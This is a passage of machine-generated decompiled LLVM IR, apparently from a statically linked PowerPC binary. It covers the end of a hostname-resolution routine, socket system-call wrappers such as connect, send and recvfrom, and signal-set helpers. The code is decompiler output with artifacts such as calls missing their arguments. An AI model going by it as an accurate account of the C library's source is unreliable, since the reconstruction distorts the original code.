  br i1 %v3_10010024, label %dec_label_pc_1001002c, label %dec_label_pc_100102d0

dec_label_pc_1001002c:                            ; preds = %dec_label_pc_10010024
  %v0_1001002c = load i32, i32* @r28, align 4
  %v1_1001002c = inttoptr i32 %v0_1001002c to i32*
  %v2_1001002c = load i32, i32* %v1_1001002c, align 4
  store i32 %v2_1001002c, i32* %r0.global-to-local, align 4
  %v3_10010030 = icmp eq i32 %v2_1001002c, 2
  br i1 %v3_10010030, label %dec_label_pc_10010038, label %dec_label_pc_100102d0

dec_label_pc_10010038:                            ; preds = %dec_label_pc_1001002c, %dec_label_pc_1001001c, %dec_label_pc_10010010
  %v0_10010038 = load i32, i32* @r30, align 4
  %v1_10010038 = sub i32 0, %v0_10010038
  store i32 %v1_10010038, i32* %r0.global-to-local, align 4
  %v0_1001003c = load i32, i32* @r27, align 4
  %v1_1001003c = load i32, i32* @r28, align 4
  %v2_1001003c = inttoptr i32 %v1_1001003c to i32*
  store i32 %v0_1001003c, i32* %v2_1001003c, align 4
  %v0_10010040 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010040 = urem i32 %v0_10010040, 4
  store i32 %v1_10010040, i32* %r0.global-to-local, align 4
  %v3_10010040 = icmp eq i32 %v1_10010040, 0
  %v0_10010058.pre = load i32, i32* @r29, align 4
  br i1 %v3_10010040, label %dec_label_pc_10010058, label %dec_label_pc_10010048

dec_label_pc_10010048:                            ; preds = %dec_label_pc_10010038
  %v2_10010048 = icmp ult i32 %v0_10010058.pre, %v1_10010040
  br i1 %v2_10010048, label %dec_label_pc_100102cc, label %dec_label_pc_10010050

dec_label_pc_10010050:                            ; preds = %dec_label_pc_10010048
  %v2_10010050 = sub i32 %v0_10010058.pre, %v1_10010040
  store i32 %v2_10010050, i32* @r29, align 4
  %v0_10010054 = load i32, i32* @r30, align 4
  %v2_10010054 = add i32 %v0_10010054, %v1_10010040
  store i32 %v2_10010054, i32* @r30, align 4
  br label %dec_label_pc_10010058

dec_label_pc_10010058:                            ; preds = %dec_label_pc_10010038, %dec_label_pc_10010050
  %v0_10010058 = phi i32 [ %v2_10010050, %dec_label_pc_10010050 ], [ %v0_10010058.pre, %dec_label_pc_10010038 ]
  %v1_10010060 = load i32, i32* @r24, align 4
  %v2_10010060 = inttoptr i32 %v1_10010060 to i32*
  store i32 -1, i32* %v2_10010060, align 4
  %tmp29 = icmp ult i32 %v0_10010058, 4
  br i1 %tmp29, label %dec_label_pc_100102cc, label %dec_label_pc_10010068

dec_label_pc_10010068:                            ; preds = %dec_label_pc_10010058
  %v0_10010068 = load i32, i32* @r29, align 4
  %v1_10010068 = add i32 %v0_10010068, -4
  store i32 %v1_10010068, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10010068, 8
  br i1 %tmp30, label %dec_label_pc_100102cc, label %dec_label_pc_10010074

dec_label_pc_10010074:                            ; preds = %dec_label_pc_10010068
  %v1_10010074 = add i32 %v0_10010068, -12
  store i32 %v1_10010074, i32* %r0.global-to-local, align 4
  %v0_10010078 = load i32, i32* @r30, align 4
  %v1_10010078 = add i32 %v0_10010078, 4
  store i32 %v1_10010078, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_10010084 = inttoptr i32 %v1_10010078 to i32*
  store i32 %v0_10010078, i32* %v3_10010084, align 4
  %v0_10010088 = load i32, i32* %r28.global-to-local, align 4
  %v1_10010088 = load i32, i32* %r25.global-to-local, align 4
  %v2_10010088 = add i32 %v1_10010088, 4
  %v3_10010088 = inttoptr i32 %v2_10010088 to i32*
  store i32 %v0_10010088, i32* %v3_10010088, align 4
  %tmp31 = icmp ult i32 %v1_10010074, 32
  br i1 %tmp31, label %dec_label_pc_100102cc, label %dec_label_pc_10010090

dec_label_pc_10010090:                            ; preds = %dec_label_pc_10010074
  %v0_10010090 = load i32, i32* @r29, align 4
  %v1_10010090 = add i32 %v0_10010090, -44
  %tmp32 = icmp ult i32 %v1_10010090, 256
  br i1 %tmp32, label %dec_label_pc_100102cc, label %dec_label_pc_1001009c

dec_label_pc_1001009c:                            ; preds = %dec_label_pc_10010090
  %v0_1001009c = load i32, i32* @r30, align 4
  %v1_1001009c = add i32 %v0_1001009c, 44
  store i32 %v1_1001009c, i32* @r31, align 4
  %v0_100100a0 = load i32, i32* @r23, align 4
  store i32 %v0_100100a0, i32* @r4, align 4
  %v1_100100a8 = add i32 %v0_1001009c, 12
  store i32 %v1_100100a8, i32* %r21.global-to-local, align 4
  store i32 %v1_1001009c, i32* %r3.global-to-local, align 4
  store i32 268501172, i32* @lr, align 4
  %v3_100100b0 = call i32 @strncpy(i32 %v1_1001009c, i32 %v0_100100a0, i32 %v1_10010090)
  %v0_100100b4 = load i32, i32* @r31, align 4
  %v1_100100b4 = load i32, i32* @r30, align 4
  %v2_100100b4 = add i32 %v1_100100b4, 12
  %v3_100100b4 = inttoptr i32 %v2_100100b4 to i32*
  store i32 %v0_100100b4, i32* %v3_100100b4, align 4
  %v0_100100b8 = load i32, i32* %r28.global-to-local, align 4
  %v1_100100b8 = load i32, i32* %r21.global-to-local, align 4
  %v2_100100b8 = add i32 %v1_100100b8, 4
  %v3_100100b8 = inttoptr i32 %v2_100100b8 to i32*
  store i32 %v0_100100b8, i32* %v3_100100b8, align 4
  %v0_100100bc = load i32, i32* @r23, align 4
  store i32 %v0_100100bc, i32* %r3.global-to-local, align 4
  %v0_100100c0 = load i32, i32* @r30, align 4
  store i32 %v0_100100c0, i32* @r4, align 4
  store i32 268501192, i32* @lr, align 4
  %v2_100100c4 = inttoptr i32 %v0_100100bc to i8*
  %v3_100100c4 = call i32 @inet_aton(i8* %v2_100100c4)
  store i32 %v3_100100c4, i32* %r3.global-to-local, align 4
  store i32 %v3_100100c4, i32* %r22.global-to-local, align 4
  %v3_100100c8 = icmp eq i32 %v3_100100c4, 0
  br i1 %v3_100100c8, label %dec_label_pc_100100fc, label %dec_label_pc_100100d0

dec_label_pc_100100d0:                            ; preds = %dec_label_pc_1001009c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100100d8 = load i32, i32* @r26, align 4
  %v2_100100d8 = add i32 %v1_100100d8, 8
  %v3_100100d8 = inttoptr i32 %v2_100100d8 to i32*
  store i32 2, i32* %v3_100100d8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_100100e0 = load i32, i32* @r31, align 4
  %v1_100100e0 = load i32, i32* @r26, align 4
  %v2_100100e0 = inttoptr i32 %v1_100100e0 to i32*
  store i32 %v0_100100e0, i32* %v2_100100e0, align 4
  %v0_100100e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100100e4 = load i32, i32* @r26, align 4
  %v2_100100e4 = add i32 %v1_100100e4, 12
  %v3_100100e4 = inttoptr i32 %v2_100100e4 to i32*
  store i32 %v0_100100e4, i32* %v3_100100e4, align 4
  %v0_100100e8 = load i32, i32* %r25.global-to-local, align 4
  %v1_100100e8 = load i32, i32* @r26, align 4
  %v2_100100e8 = add i32 %v1_100100e8, 16
  %v3_100100e8 = inttoptr i32 %v2_100100e8 to i32*
  store i32 %v0_100100e8, i32* %v3_100100e8, align 4
  %v0_100100ec = load i32, i32* %r21.global-to-local, align 4
  %v1_100100ec = load i32, i32* @r26, align 4
  %v2_100100ec = add i32 %v1_100100ec, 4
  %v3_100100ec = inttoptr i32 %v2_100100ec to i32*
  store i32 %v0_100100ec, i32* %v3_100100ec, align 4
  %v0_100100f0 = load i32, i32* @r26, align 4
  %v1_100100f0 = load i32, i32* @r20, align 4
  %v2_100100f0 = inttoptr i32 %v1_100100f0 to i32*
  store i32 %v0_100100f0, i32* %v2_100100f0, align 4
  %v0_100100f4 = load i32, i32* %r28.global-to-local, align 4
  %v1_100100f4 = load i32, i32* @r24, align 4
  %v2_100100f4 = inttoptr i32 %v1_100100f4 to i32*
  store i32 %v0_100100f4, i32* %v2_100100f4, align 4
  br label %dec_label_pc_100102d0

dec_label_pc_100100fc:                            ; preds = %dec_label_pc_1001009c
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268501252, i32* @lr, align 4
  %v0_10010100 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r29.global-to-local, align 4
  %v2_10010108 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_10010108, i32* %r28.global-to-local, align 4
  store i32 %v2_10010108, i32* @r3, align 4
  %v0_1001011c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r3.global-to-local, align 4
  %v0_10010124 = call i32 @__pthread_return_0()
  %v3_1001012c = load i32, i32* @global_var_1002c94c.1080, align 4
  store i32 %v3_1001012c, i32* %r29.global-to-local, align 4
  store i32 %v2_10010108, i32* @r3, align 4
  %v0_10010138 = call i32 @__pthread_return_void()
  %v0_10010140 = load i32, i32* @r23, align 4
  store i32 %v0_10010140, i32* %r3.global-to-local, align 4
  %v2_10010150 = ptrtoint i32* %stack_var_-120 to i32
  %v2_10010154 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10010158 = load i32, i32* %r22.global-to-local, align 4
  store i32 268501352, i32* @lr, align 4
  %v6_10010164 = inttoptr i32 %v0_10010140 to i8*
  %v7_10010164 = call i32 @__dns_lookup(i8* %v6_10010164, i32 1, i32 %v3_1001012c, i32 ptrtoint (i32* @global_var_10032c48.1081 to i32), i32 %v2_10010150, i32 %v2_10010154)
  store i32 %v7_10010164, i32* %r3.global-to-local, align 4
  %v1_10010168 = icmp slt i32 %v7_10010164, 0
  br i1 %v1_10010168, label %dec_label_pc_100102b0, label %dec_label_pc_10010170

dec_label_pc_10010170:                            ; preds = %dec_label_pc_100100fc
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10010178 = add i32 %tmp19, 4
  %v2_1001017c = mul i32 %v0_10010158, %v1_10010178
  %v1_10010180 = add i32 %v2_1001017c, 256
  %v1_10010184 = load i32, i32* @r27, align 4
  %v3_10010184 = icmp ugt i32 %v1_10010180, %v1_10010184
  br i1 %v3_10010184, label %dec_label_pc_1001018c, label %dec_label_pc_100101a8

dec_label_pc_1001018c:                            ; preds = %dec_label_pc_10010170
  %v3_1001018c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001018c, i32* %r3.global-to-local, align 4
  store i32 268501396, i32* @lr, align 4
  %v1_10010190 = call i32 @free(i32 %v3_1001018c)
  %v3_10010194 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10010194, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001019c.1082 to i32), i32* @lr, align 4
  %v1_10010198 = call i32 @free(i32 %v3_10010194)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_100101a0 = load i32, i32* @r19, align 4
  %v1_100101a0 = load i32, i32* @r24, align 4
  %v2_100101a0 = inttoptr i32 %v1_100101a0 to i32*
  store i32 %v0_100101a0, i32* %v2_100101a0, align 4
  br label %dec_label_pc_100102d0

dec_label_pc_100101a8:                            ; preds = %dec_label_pc_10010170
  %v3_100101a8 = icmp eq i32 %v0_10010158, 0
  br i1 %v3_100101a8, label %dec_label_pc_100101a8.dec_label_pc_1001024c_crit_edge, label %dec_label_pc_100101b0

dec_label_pc_100101a8.dec_label_pc_1001024c_crit_edge: ; preds = %dec_label_pc_100101a8
  %v0_10010254.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001024c

dec_label_pc_100101b0:                            ; preds = %dec_label_pc_100101a8
  %v2_100101b0 = mul i32 %v0_10010158, %tmp19
  store i32 %v2_100101b0, i32* @r5, align 4
  %v0_100101b4 = load i32, i32* @r30, align 4
  %v1_100101b4 = add i32 %v0_100101b4, 36
  store i32 %v1_100101b4, i32* %r3.global-to-local, align 4
  %v0_100101b8 = load i32, i32* @r31, align 4
  store i32 268501440, i32* @lr, align 4
  %v2_100101bc = call i32 @memmove(i32 %v1_100101b4, i32 %v0_100101b8)
  store i32 %v2_100101bc, i32* %r3.global-to-local, align 4
  store i32 %v2_100101b0, i32* %r0.global-to-local, align 4
  %v0_100101cc = load i32, i32* @r30, align 4
  %v1_100101cc = load i32, i32* @r31, align 4
  %v3_100101cc = add i32 %v1_100101cc, %v2_100101b0
  %v4_100101cc = inttoptr i32 %v3_100101cc to i32*
  store i32 %v0_100101cc, i32* %v4_100101cc, align 4
  %v0_100101d0 = load i32, i32* @r31, align 4
  %v1_100101d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_100101d0 = add i32 %v1_100101d0, %v0_100101d0
  store i32 %v2_100101d0, i32* @r25, align 4
  %v1_100101d8 = add i32 %v0_10010158, -1
  store i32 %v1_100101d8, i32* %r11.global-to-local, align 4
  %v1_100101dc = add i32 %v0_10010158, 1
  %v2_100101e0 = icmp sgt i32 %v1_100101d8, -1
  store i32 %v1_100101dc, i32* %ctr.global-to-local, align 4
  br i1 %v2_100101e0, label %dec_label_pc_10010210.preheader, label %dec_label_pc_100101ec

dec_label_pc_100101ec:                            ; preds = %dec_label_pc_100101b0
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010210.preheader

dec_label_pc_10010210.preheader:                  ; preds = %dec_label_pc_100101ec, %dec_label_pc_100101b0
  %v0_100102186 = phi i32 [ 1, %dec_label_pc_100101ec ], [ %v1_100101dc, %dec_label_pc_100101b0 ]
  %v1_100102103 = mul i32 %v1_100101d8, 4
  store i32 %v1_100102103, i32* %r0.global-to-local, align 4
  %v2_100102145 = add i32 %v2_100101d0, %v1_100102103
  %v1_100102187 = add i32 %v0_100102186, -1
  store i32 %v1_100102187, i32* %ctr.global-to-local, align 4
  %v2_100102188 = icmp eq i32 %v1_100102187, 0
  br i1 %v2_100102188, label %dec_label_pc_1001021c, label %dec_label_pc_100101f8

dec_label_pc_100101f8:                            ; preds = %dec_label_pc_10010210.preheader, %dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge
  %v1_1001020c = phi i32 [ %v2_10010214, %dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge ], [ %v2_100102145, %dec_label_pc_10010210.preheader ]
  %v0_10010204 = phi i32 [ %v0_10010204.pre, %dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge ], [ %v0_100101d0, %dec_label_pc_10010210.preheader ]
  %v0_100101fc = phi i32 [ %v0_10010210, %dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge ], [ %v1_100101d8, %dec_label_pc_10010210.preheader ]
  %v2_100101fc = mul i32 %v0_100101fc, %tmp19
  %v1_10010200 = add i32 %v0_100101fc, -1
  store i32 %v1_10010200, i32* %r11.global-to-local, align 4
  %v2_10010204 = add i32 %v0_10010204, -8
  %v1_10010208 = add i32 %v2_10010204, %v2_100101fc
  %v2_1001020c = add i32 %v1_1001020c, 4
  %v3_1001020c = inttoptr i32 %v2_1001020c to i32*
  store i32 %v1_10010208, i32* %v3_1001020c, align 4
  %v0_10010210 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010210 = mul i32 %v0_10010210, 4
  store i32 %v1_10010210, i32* %r0.global-to-local, align 4
  %v1_10010214 = load i32, i32* @r25, align 4
  %v0_10010218 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010218 = add i32 %v0_10010218, -1
  store i32 %v1_10010218, i32* %ctr.global-to-local, align 4
  %v2_10010218 = icmp eq i32 %v1_10010218, 0
  br i1 %v2_10010218, label %dec_label_pc_1001021c, label %dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge

dec_label_pc_100101f8.dec_label_pc_100101f8_crit_edge: ; preds = %dec_label_pc_100101f8
  %v2_10010214 = add i32 %v1_10010214, %v1_10010210
  %v0_10010204.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100101f8

dec_label_pc_1001021c:                            ; preds = %dec_label_pc_100101f8, %dec_label_pc_10010210.preheader
  %v1_10010228 = phi i32 [ %v2_100101d0, %dec_label_pc_10010210.preheader ], [ %v1_10010214, %dec_label_pc_100101f8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10010224 = mul i32 %v0_10010158, 4
  %v2_10010228 = add i32 %v1_10010224, 4
  %v2_1001022c = add i32 %v2_10010228, %v1_10010228
  %v3_1001022c = inttoptr i32 %v2_1001022c to i32*
  store i32 0, i32* %v3_1001022c, align 4
  %v0_10010238 = load i32, i32* @r25, align 4
  %v2_10010238 = add i32 %v0_10010238, %v1_10010224
  store i32 %v2_10010238, i32* %r11.global-to-local, align 4
  %v1_1001023c = load i32, i32* @r31, align 4
  %v2_1001023c = sub i32 %v1_1001023c, %v2_10010238
  %v1_10010240 = add i32 %v2_10010238, 8
  store i32 %v1_10010240, i32* @r31, align 4
  %v0_10010244 = load i32, i32* @r27, align 4
  %v2_10010244 = add i32 %v0_10010244, %v2_1001023c
  %v1_10010248 = add i32 %v2_10010244, -8
  br label %dec_label_pc_1001024c

dec_label_pc_1001024c:                            ; preds = %dec_label_pc_100101a8.dec_label_pc_1001024c_crit_edge, %dec_label_pc_1001021c
  %v0_10010254 = phi i32 [ %v0_10010254.pre, %dec_label_pc_100101a8.dec_label_pc_1001024c_crit_edge ], [ %v1_10010240, %dec_label_pc_1001021c ]
  %v0_10010250 = phi i32 [ %v1_10010184, %dec_label_pc_100101a8.dec_label_pc_1001024c_crit_edge ], [ %v1_10010248, %dec_label_pc_1001021c ]
  %v3_1001024c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001024c, i32* @r4, align 4
  store i32 %v0_10010254, i32* %r3.global-to-local, align 4
  store i32 268501596, i32* @lr, align 4
  %v3_10010258 = call i32 @strncpy(i32 %v0_10010254, i32 %v3_1001024c, i32 %v0_10010250)
  %v3_1001025c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1001025c, i32* %r3.global-to-local, align 4
  store i32 268501604, i32* @lr, align 4
  %v1_10010260 = call i32 @free(i32 %v3_1001025c)
  store i32 %v1_10010260, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10010268 = icmp eq i32 %tmp18, 1
  br i1 %v3_10010268, label %dec_label_pc_10010270, label %dec_label_pc_100102b8

dec_label_pc_10010270:                            ; preds = %dec_label_pc_1001024c
  store i32 4, i32* @r5, align 4
  %v0_10010278 = load i32, i32* @r30, align 4
  store i32 %v0_10010278, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010280.1083 to i32), i32* @lr, align 4
  %v0_1001027c = call i32 @memcpy()
  %v1_10010284 = load i32, i32* @r26, align 4
  %v2_10010284 = add i32 %v1_10010284, 8
  %v3_10010284 = inttoptr i32 %v2_10010284 to i32*
  store i32 2, i32* %v3_10010284, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1001028c = load i32, i32* @r26, align 4
  %v2_1001028c = add i32 %v1_1001028c, 12
  %v3_1001028c = inttoptr i32 %v2_1001028c to i32*
  store i32 4, i32* %v3_1001028c, align 4
  %v0_10010290 = load i32, i32* @r31, align 4
  %v1_10010290 = load i32, i32* @r26, align 4
  %v2_10010290 = inttoptr i32 %v1_10010290 to i32*
  store i32 %v0_10010290, i32* %v2_10010290, align 4
  %v0_10010294 = load i32, i32* @r25, align 4
  %v1_10010294 = load i32, i32* @r26, align 4
  %v2_10010294 = add i32 %v1_10010294, 16
  %v3_10010294 = inttoptr i32 %v2_10010294 to i32*
  store i32 %v0_10010294, i32* %v3_10010294, align 4
  %v0_10010298 = load i32, i32* @r21, align 4
  %v1_10010298 = load i32, i32* @r26, align 4
  %v2_10010298 = add i32 %v1_10010298, 4
  %v3_10010298 = inttoptr i32 %v2_10010298 to i32*
  store i32 %v0_10010298, i32* %v3_10010298, align 4
  %v3_1001029c = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1001029c, i32* %r3.global-to-local, align 4
  store i32 268501668, i32* @lr, align 4
  %v1_100102a0 = call i32 @free(i32 %v3_1001029c)
  store i32 %v1_100102a0, i32* %r3.global-to-local, align 4
  %v0_100102a4 = load i32, i32* @r26, align 4
  %v1_100102a4 = load i32, i32* @r20, align 4
  %v2_100102a4 = inttoptr i32 %v1_100102a4 to i32*
  store i32 %v0_100102a4, i32* %v2_100102a4, align 4
  br label %dec_label_pc_100102b0

dec_label_pc_100102b0:                            ; preds = %dec_label_pc_100102b8, %dec_label_pc_100100fc, %dec_label_pc_10010270
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10010270 ], [ 2, %dec_label_pc_100100fc ], [ 2, %dec_label_pc_100102b8 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_10010270 ], [ 1, %dec_label_pc_100100fc ], [ 1, %dec_label_pc_100102b8 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_100102b0 = load i32, i32* @r24, align 4
  %v2_100102b0 = inttoptr i32 %v1_100102b0 to i32*
  store i32 %storemerge, i32* %v2_100102b0, align 4
  br label %dec_label_pc_100102d0

dec_label_pc_100102b8:                            ; preds = %dec_label_pc_1001024c
  %v3_100102b8 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_100102b8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100102c0.1084 to i32), i32* @lr, align 4
  %v1_100102bc = call i32 @free(i32 %v3_100102b8)
  store i32 %v1_100102bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102b0

dec_label_pc_100102cc:                            ; preds = %dec_label_pc_10010090, %dec_label_pc_10010074, %dec_label_pc_10010068, %dec_label_pc_10010058, %dec_label_pc_10010048
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100102d0

dec_label_pc_100102d0:                            ; preds = %dec_label_pc_1001002c, %dec_label_pc_10010024, %dec_label_pc_1000ffd8, %entry, %dec_label_pc_100102b0, %dec_label_pc_1001018c, %dec_label_pc_100100d0, %dec_label_pc_100102cc
  store i32 %v0_1000ffa4, i32* %r0.global-to-local, align 4
  %v0_100102e0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100102e0

; uselistorder directives
  uselistorder i32 %v0_10010254, { 1, 0 }
  uselistorder i32 %v1_10010224, { 1, 0 }
  uselistorder i32 %v1_10010218, { 1, 0 }
  uselistorder i32 %v1_10010210, { 1, 0 }
  uselistorder i32 %v0_100101fc, { 1, 0 }
  uselistorder i32 %v1_100102103, { 1, 0 }
  uselistorder i32 %v1_100101d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100101d0, { 1, 0, 2 }
  uselistorder i32 %v0_10010158, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1001009c, { 1, 0, 2 }
  uselistorder i32 %v0_10010058.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10010040, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 25, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 2, 23, 24, 26, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100102d0, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100102b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001024c, { 1, 0 }
  uselistorder label %dec_label_pc_100101f8, { 1, 0 }
  uselistorder label %dec_label_pc_10010058, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100102f8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501768, i32* @lr, align 4
  %v2_10010304 = call i32 @__socketcall(i32 3, i32 %v2_100102f8)
  ret i32 %v2_10010304

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001032c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501820, i32* @lr, align 4
  %v2_10010338 = call i32 @__socketcall(i32 6, i32 %v2_1001032c)
  ret i32 %v2_10010338

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10010360 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268501880, i32* @lr, align 4
  %v2_10010374 = call i32 @__socketcall(i32 15, i32 %v2_10010360)
  ret i32 %v2_10010374

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1001039c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501936, i32* @lr, align 4
  %v2_100103ac = call i32 @__socketcall(i32 10, i32 %v2_1001039c)
  ret i32 %v2_100103ac

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100103d4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268501992, i32* @lr, align 4
  %v2_100103e4 = call i32 @__socketcall(i32 9, i32 %v2_100103d4)
  ret i32 %v2_100103e4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001040c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268502056, i32* @lr, align 4
  %v2_10010424 = call i32 @__socketcall(i32 11, i32 %v2_1001040c)
  ret i32 %v2_10010424

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1001044c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268502116, i32* @lr, align 4
  %v2_10010460 = call i32 @__socketcall(i32 14, i32 %v2_1001044c)
  ret i32 %v2_10010460

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10010488 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268502168, i32* @lr, align 4
  %v2_10010494 = call i32 @__socketcall(i32 1, i32 %v2_10010488)
  ret i32 %v2_10010494

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 6, 5, 2, 3, 4, 7, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_100104d8, label %dec_label_pc_100104c4

dec_label_pc_100104c4:                            ; preds = %entry
  %v0_100104c4 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100104d0 = inttoptr i32 %v0_100104c4 to i32*
  store i32 22, i32* %v2_100104d0, align 4
  %v0_100104e4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100104e0

dec_label_pc_100104d8:                            ; preds = %entry
  %v0_100104d8 = call i32 @__sigaddset()
  store i32 %v0_100104d8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100104e0

dec_label_pc_100104e0:                            ; preds = %dec_label_pc_100104c4, %dec_label_pc_100104d8
  %v0_100104e4 = phi i32 [ %v0_100104e4.pre, %dec_label_pc_100104c4 ], [ %v0_100104d8, %dec_label_pc_100104d8 ]
  ret i32 %v0_100104e4

; uselistorder directives
  uselistorder label %dec_label_pc_100104e0, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268502284, i32* @lr, align 4
  %v3_10010508 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
